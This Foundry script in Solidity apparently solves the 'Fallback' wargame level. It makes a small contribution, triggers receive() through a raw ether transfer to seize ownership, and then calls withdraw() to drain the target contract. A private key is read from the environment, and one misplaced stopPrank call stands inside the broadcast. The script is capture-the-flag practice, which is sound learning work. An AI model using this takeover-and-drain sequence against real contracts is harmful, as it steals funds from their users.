// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "src/Fallback.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract FallbackSolution is Script {
    Fallback public fallBack = Fallback(payable(0x709b718409e49Bf6dBEE9111A8EC7B8070E8B6A8));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // contribute ile ufak bir bagis yap
        // sonra receive ile owner ol

        fallBack.contribute{value: 0.0001 ether}();
        address(fallBack).call{value: 0.0001 ether}("");
        fallBack.withdraw();
        vm.stopPrank();
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
